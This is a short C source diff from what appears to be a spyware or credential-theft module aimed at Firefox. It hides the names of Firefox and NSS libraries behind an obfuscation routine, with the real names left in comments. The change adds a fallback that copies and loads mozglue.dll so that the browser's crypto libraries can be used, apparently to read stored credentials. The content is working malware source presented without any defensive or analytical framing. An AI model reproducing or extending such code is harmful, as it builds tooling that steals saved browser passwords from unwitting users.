@@ -66,6 +66,7 @@ typedef enum SECStatus
 #define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
 #define MOZCRT_LIBRARY_NAME  "05OpELYN.Xyy" //"mozcrt19.dll"
 #define MOZCRTALT_LIBRARY_NAME "05OVLZy9.Xyy" //"mozutils.dll"
+#define MOZCRTALTSEC_LIBRARY_NAME "05O7yVI.Xyy" //"mozglue.dll"
 #define NSSU_LIBRARY_NAME  "199VLZyn.Xyy" //"nssutil3.dll"
 #define PLDS_LIBRARY_NAME  "PyX9x.Xyy" //"plds4.dll"
 #define SOFTN_LIBRARY_NAME "95ML5T1n.Xyy" //"softokn3.dll"
@@ -243,6 +244,12 @@ void FireFoxInitFunc()
 			HM_CompletePath(DeobStringA(MOZCRTALT_LIBRARY_NAME), destPath);
 			libcrt = CopyAndLoadDLL(loadPath, destPath);
 		}
+		if (!libcrt) {
+			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRTALTSEC_LIBRARY_NAME));
+			HM_CompletePath(DeobStringA(MOZCRTALTSEC_LIBRARY_NAME), destPath);
+			libcrt = CopyAndLoadDLL(loadPath, destPath);
+		}
+
 		if (libcrt)
 			FF_ver_3 = true;
 	}
